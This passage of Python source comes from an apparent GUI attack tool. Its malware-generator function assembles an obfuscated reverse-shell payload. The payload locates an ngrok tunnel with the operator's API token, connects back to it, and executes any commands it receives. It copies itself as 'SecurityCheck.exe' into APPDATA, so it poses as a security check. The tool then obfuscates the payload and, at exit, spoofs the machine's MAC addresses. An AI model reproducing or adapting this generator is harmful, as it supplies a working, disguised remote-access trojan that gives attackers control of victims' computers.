      self.c2_listen_active_label.place(x=30,y=338)
      API = self.ngrok_token.get()

      malware = "import socket, subprocess, re, tempfile, os, requests, time, shutil\n"
      malware += 'exec("def _(_): return __import__(\'subprocess\').check_output(_, shell=True)")\n'
      malware += 'exec("def a(b):\\n  if b.startswith(\\\"cd \\\" ):\\n    c=b.split(\\\" \\", 1)[1]; os.chdir(c); return \\"Changed directory to \\"+os.getcwd()+\\\"\\\\n\\\"\\n  return _ (b).decode(\\\"cp850\\\")")\n'
      malware += 'exec("def b(c):\\n  d = {\\\"Authorization\\\": f\\\"Bearer '+API+'\\\", \\"Ngrok-Version\\\": \\"2\\\"}\\n  while True:\\n    try:\\n      e = requests.get(\\\"https://api.ngrok.com/tunnels\\\", headers=d)\\n      f = e.json()[\\\"tunnels\\\"][0][\\\"public_url\\\"].split(\\\"://\\\")[1]\\n      g = f.split(\\\":\\\")[0]\\n      h = f.split(\\\":\\\")[1]\\n\\n      return g, h\\n    except:\\n      pass\\n      time.sleep(5)")\n'
      malware += 'exec("def c(i,p):\\n  j=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\\n  j.connect((i,int(p)))\\n  while True:\\n    k=j.recv(1024).decode().strip()\\n    try:\\n      j.send(b\\\"\\\\n\\\"+a(k).encode()+b\\\"\\\\n\\\")\\n    except:\\n      j.send(b\\\"\\\\n[!] Error\\\\n\\\\n\\\")\\n  j.close()")\n'
      malware += 'exec("if __name__ == \\"__main__\\\":\\n  f_p = os.getcwd()\\n  sP = f\\\"{f_p}\\\\\\\\SecurityCheck.exe\\\"\\n  dP = os.path.join(os.getenv(\\\"APPDATA\\\"), \\"SecurityCheck.exe\\\")\\n  if not os.path.exists(dP):\\n    os.makedirs(os.path.dirname(dP), exist_ok=True)\\n    shutil.copy(sP, dP)\\n    pass\\n  else:\\n    pass")\n'
      malware += 'exec("if __name__==\\"__main__\\\":\\n  i,p=b(\\"'+API+'\\")\\n  while True:\\n    try:\\n      c(i,p)\\n    except:\\n      time.sleep(5)\\n      i,p=b(\\"'+API+'\\")")'


      print(malware)

      with open("scripts/SecurityCheck.py","w") as f:
        f.write(malware)

      try:
        subprocess.run("bash scripts/obfuscate_on.sh",shell=True,check=True)
        CTkMessagebox(title="Succesfuly",message=f"Malware generated succesfuly in {os.getcwd()}/SecurityCheck.exe.",height=370, width=550,button_color="red",button_width=50,button_height=50,button_hover_color="#610101",justify="center",font=("Hack Nerd Font",15),sound=None,wraplength=520,icon="check")
         
      except:
        CTkMessagebox(title="Failed",message="Malware generating failed.",height=370, width=550,button_color="red",button_width=50,button_height=50,button_hover_color="#610101",justify="center",font=("Hack Nerd Font",15),sound=None,wraplength=520,icon="cancel")
      self.c2_listen_active_label.destroy()

## Generate Malware Button


    def start_c2(self):
      print(self.obfuscate_switch_option.get(), self.ngrok_token.get())

      if not self.ngrok_token.get():
        CTkMessagebox(title="Error!",message="Enter a Ngrok API.",height=370, width=430,button_color="red",button_width=50,button_height=50,button_hover_color="#610101",justify="center",font=("Hack Nerd Font",15),sound=None,wraplength=520,icon="cancel")
      else:
        if self.obfuscate_switch_option.get() == "on":
          CTkMessagebox(title="Processing",message="Generating the malware, this can take several minutes.",height=370, width=650,button_color="red",button_width=50,button_height=50,button_hover_color="#610101",justify="center",font=("Hack Nerd Font",15),sound=None,wraplength=520,icon="info")
          obfuscate_thread=threading.Thread(target=self.obfuscate_on_thread)
          obfuscate_thread.start()
        else:
          CTkMessagebox(title="Processing",message="Generating the malware, this can take several minutes.",height=370, width=650,button_color="red",button_width=50,button_height=50,button_hover_color="#610101",justify="center",font=("Hack Nerd Font",15),sound=None,wraplength=520,icon="info")
          obfuscate_thread=threading.Thread(target=self.obfuscate_off_thread)
          obfuscate_thread.start()



###############################
####### START PROGRAMME #######
###############################


if __name__ == "__main__":
    if subprocess.check_output(["whoami"]).decode().strip()=='root':
        subprocess.run(["cp fonts/* /usr/local/share/fonts"],shell=True,check=True)
        subprocess.run(["fc-cache -fv"],shell=True,check=True)
        app = Program()
        app.config(bg="black")
        app.mainloop()
        interfaces=scapy.get_if_list()
        for i in interfaces:
            if len(i.split("docker"))==1:
                subprocess.run(["macchanger","-p",i])
        try:
            subprocess.run(["ps -aux | grep ngrok | awk '{print $2}' | head -n1 | xargs kill"],shell=True,check=True)
        except:
            pass
        sys.exit(1)
    else:
        app=Program()
        app.config(bg="black")
        CTkMessagebox(title="Warning!",message="In order for the programme to use all functions it is necessary to run it as the root user.",height=370, width=630,button_color="red",button_width=50,button_height=50,button_hover_color="#610101",justify="center",font=("Hack Nerd Font",15),sound=None,wraplength=520,icon="warning")
        app.mainloop()